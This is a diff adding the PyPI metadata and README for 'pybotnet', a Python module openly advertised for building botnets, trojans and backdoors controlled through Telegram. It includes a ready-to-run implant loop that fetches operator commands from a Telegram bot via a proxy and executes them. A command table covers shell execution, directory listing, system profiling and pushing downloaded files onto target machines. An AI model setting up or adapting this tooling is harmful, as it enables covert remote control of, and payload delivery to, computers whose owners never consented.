@@ -1,0 +1,106 @@
+Metadata-Version: 2.1
+Name: pybotnet
+Version: 0.15.4
+Summary: A Python module for building botnet ,backdoor or trojan with Telegram control panel
+Home-page: https://github.com/onionj/pybotnet
+Author: onionj
+Author-email: onionj98@gmail.com
+License: gpl-3.0
+Keywords: onionj pybotnet,make python trojan,make python backdoor,make python botnet,pybotnet
+Platform: UNKNOWN
+Classifier: License :: OSI Approved :: GNU Lesser General Public License v3 or later (LGPLv3+)
+Classifier: Programming Language :: Python :: 3.6
+Classifier: Programming Language :: Python :: 3.7
+Classifier: Programming Language :: Python :: 3.8
+Classifier: Programming Language :: Python :: 3.9
+Requires-Python: >=3.7.0
+Description-Content-Type: text/markdown
+License-File: LICENSE
+
+
+ 
+ <p align="center">
+  <img src="https://github.com/onionj/pybotnet/blob/master/icon/trojan.png">
+  <h1 align="center">pybotnet</h1>
+  <p align="center"> A Python module for building <b>botnet</b> , <b>trojan</b>  or <b>backdoor</b> for windows and linux with Telegram control panel </p>
+
+
+  <p align="center">
+    <a href="https://github.com/onionj/pybotnet/blob/master/LICENSE">
+      <img src="https://img.shields.io/badge/license-GPLv3-blue.svg" />
+    </a>
+    <a href="https://www.python.org/">
+    	<img src="https://img.shields.io/badge/built%20with-Python3-red.svg" />
+    </a>
+  </p>
+</p>
+ 
+
+
+
+#### Features:
+* get command from telegram and execute scripts 
+* get command and send message by third party proxy
+* get target info 
+* sleep source by Optional message
+* get ls (dirctory list)
+* export file to targets system (target download a link :) )
+* for more see commands table end of this page 
+
+See the [TODO List](https://github.com/onionj/pybotnet/blob/master/TODOLIST.MD) if you want to *help* me <3
+
+
+#### Requirements:
+
+* Python 3.6 or higher.
+* Telegram account
+* your account number ID (get it from @userinfobot)
+* telegram api token (Get it from the telegram botfather)
+
+#### Usage:
+```
+pip install pybotnet
+```
+
+```python
+
+from pybotnet import pybotnet
+import time
+
+# Edit this section and enter your information:
+TELEGRAM_TOKEN = '1468299547:AAHsvEH-5VyIfWYMzZcYxF_e00000000000'
+ADMIN_CHAT_ID = '12345678910'
+
+
+
+# * if you compile code without shell: is_sheel=False
+# * show_log: just for debugging
+# * send_system_data: send system short info in bot messages
+
+bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID,
+                        show_log=False, send_system_data=True, is_shell=True)
+
+delay = 10
+
+while True:
+    print('*'*100)
+    bot.get_and_execute_scripts_by_third_party_proxy()
+    time.sleep(delay)
+
+```
+
+#### Commmands:
+
+*Send this COMMANDs to your api bot in telegram, using the admin account.* \
+\
+*If you want the command to run only on one system, write the MAC address of that system first, like:* `66619484755211 get_info`
+
+COMMAND | Sample | DO THIS | Minimum version required | tested on |
+--------|--------|---------|--------------------------|----------|
+`get_info` | `get_info` |return system info | 0.06 | windows, linux |
+`do_sleep <scconds> <message (Optional)>` | `do_sleep 99999 hi, i see you!` | \<if message != none : print(message) > ; time.sleep(seccond) | 0.08 | windows, linux |
+`cmd <system command>` | `cmd mkdir new_folder` | run system command in shell or cmd (Be careful not to give endless command like `ping google.com -t`  in windows or `ping google.com` in linux)  TODO:add timeout| 0.07 | windows, linux|
+`ls <route>` | `ls C:\ `,` ls /home` |Returns a list of folders and files in that path | 0.09 | windows, linux |
+`export_file <download_link>` | `export_file https://github.com/onionj/pybotnet/archive/refs/heads/master.zip` |target donwload this file and save to script path route| 0.14 | windows |
+
+
